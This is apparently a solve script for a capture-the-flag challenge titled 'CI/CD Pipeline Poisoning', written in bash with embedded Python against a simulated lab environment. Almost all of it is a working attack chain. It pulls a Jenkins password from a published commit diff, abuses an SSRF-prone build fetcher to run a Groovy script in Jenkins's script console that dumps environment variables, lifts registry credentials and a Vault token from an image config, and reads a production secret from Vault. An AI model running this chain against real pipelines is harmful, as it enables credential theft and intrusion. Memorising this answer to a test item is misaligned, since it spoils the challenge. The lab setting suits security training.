#!/usr/bin/env bash
# APEX-042-25 — "CI/CD Pipeline Poisoning" (tags: cicd, supply_chain, ssrf)
#
# The build pipeline is the target, and none of it is reachable directly: the
# portal says so on its front page. What is reachable is a build-status feature
# that fetches a URL for you, and that is the whole difference. Everything after
# step one happens through it.
#
# The credentials come out of history rather than out of the code. A commit
# removed the hard-coded Jenkins password and the removal is itself published:
# a diff that deletes a secret is a diff that contains it. Jenkins then hands
# over its environment through the script console, the registry hands over an
# image config, and an image config is a place people leave tokens.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
. "$(dirname "$0")/lib.sh"
SESSION="apex042-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

"$H5I" browser open "$URL/" --session "$SESSION" --new --capture >/dev/null

# 1. The commit that removed the password, which still shows it.
read -r JENKINS_USER JENKINS_PASS <<<"$(send "$SESSION" req_0 --create \
    --set path=/git/api/v1/repos/devops/ci-config/git/commits | body | python3 -c '
import json, re, sys
for commit in json.load(sys.stdin):
    for changed in commit.get("files", []):
        found = re.search(r"JENKINS_CREDS = .(\w+):([^\x27\"]+).", changed.get("patch", ""))
        if found:
            print(found.group(1), found.group(2))
            raise SystemExit
')"
BASIC="$(printf '%s:%s' "$JENKINS_USER" "$JENKINS_PASS" | base64 -w0)"

# 2 and 3. The fetcher reaches Jenkins; the credentials open its script console;
#    and a script console prints whatever the process can see.
ENVIRONMENT="$(send "$SESSION" req_0 --create \
    --set method=POST --set path=/app/build-trigger \
    --set header.Content-Type=application/json \
    --set 'json.url=http://jenkins-sim:8080/jenkins/script' \
    --set json.method=POST \
    --set 'json.body=script=println System.getenv().collect { k, v -> "$k=$v" }.join("\n")' \
    --set "json.headers.Authorization=Basic $BASIC" \
    --set 'json.headers.Content-Type=application/x-www-form-urlencoded' | body)"

read -r REGISTRY_USER REGISTRY_TOKEN <<<"$(printf '%s' "$ENVIRONMENT" | python3 -c '
import json, sys
printed = json.load(sys.stdin)["data"]["output"]
found = dict(
    line.split("=", 1) for line in printed.splitlines() if "=" in line
)
print(found.get("REGISTRY_USER", ""), found.get("REGISTRY_TOKEN", ""))
')"
REGISTRY_BASIC="$(printf '%s:%s' "$REGISTRY_USER" "$REGISTRY_TOKEN" | base64 -w0)"

# `/app/build-status` forwards the caller's own `Authorization` and
# `X-Vault-Token` headers to whatever it fetches — not ones named in the body,
# which is what `/app/build-trigger` does. So the credential rides on the
# request rather than inside it.
fetch() {
    send "$SESSION" req_0 --create \
        --set method=POST --set path=/app/build-status \
        --set header.Content-Type=application/json \
        --set "header.Authorization=Basic $REGISTRY_BASIC" \
        --set "json.url=$1" | body
}

# 4. An image's config blob, which is where the Vault token was left.
DIGEST="$(fetch 'http://registry:5000/v2/webapp/manifests/latest' |
    python3 -c 'import json,sys; print(json.load(sys.stdin)["data"]["config"]["digest"])')"
VAULT="$(fetch "http://registry:5000/v2/webapp/blobs/$DIGEST" | python3 -c '
import json, sys
for row in json.load(sys.stdin)["data"]["config"]["Env"]:
    if row.startswith("VAULT_TOKEN="):
        print(row.split("=", 1)[1])
        break
')"

# 5. And the token opens the vault, still through the same fetcher.
send "$SESSION" req_0 --create \
    --set method=POST --set path=/app/build-status \
    --set header.Content-Type=application/json \
    --set "header.X-Vault-Token=$VAULT" \
    --set 'json.url=http://vault:8200/v1/secret/data/production/flag' | flag
